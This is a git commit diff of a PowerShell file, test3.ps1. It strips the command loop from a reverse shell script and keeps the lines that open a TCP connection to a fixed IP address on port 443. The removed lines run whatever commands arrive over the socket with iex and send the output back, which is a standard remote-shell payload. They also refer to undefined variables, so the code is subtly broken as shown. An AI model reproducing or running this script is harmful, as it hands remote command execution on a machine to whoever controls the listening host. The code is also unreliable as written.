de495fd237601caaafc4410407446e4062131010
mveken <martijn@veken.nl>
2019-12-10 14:54:57 +0100

    Update test3.ps1

--- test3.ps1
+++ test3.ps1
@@ -1,12 +1,3 @@
 $c = New-Object System.Net.Sockets.TCPClient("10.238.20.231",443);
 $s = $c.GetStream();
-[byte[]]$b = 0..65535|%{0};
-while(($i = $s.Read($bytes, 0, $b.Length)) -ne 0){
-    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-    $sb= (iex $d 2>&1 | Out-String );
-    $sb2 = $sb + "PS " + (pwd).Path + "> ";
-    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
-    $stream.Write($sbt,0,$sbt.Length);
-    $stream.Flush()
-};
-$client.Close()
+
